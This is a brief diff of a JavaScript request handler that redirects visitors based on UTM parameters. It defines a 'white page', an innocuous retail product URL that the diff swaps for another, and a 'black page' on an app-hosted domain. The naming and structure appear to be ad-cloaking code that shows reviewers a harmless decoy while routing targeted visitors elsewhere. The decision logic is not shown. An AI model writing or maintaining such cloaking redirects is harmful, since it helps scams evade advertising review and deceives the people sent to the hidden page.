@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://fromrebel.com/collections/health-safety/products/115-inch-length-5-panel-adjustable-wide-fireplace-fence-black";
+    const whitePageURL = "https://www.remember.de/en/Hot-water-bottle-Pepe/WF02/";
     const blackPageURL = "https://casssshlov.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
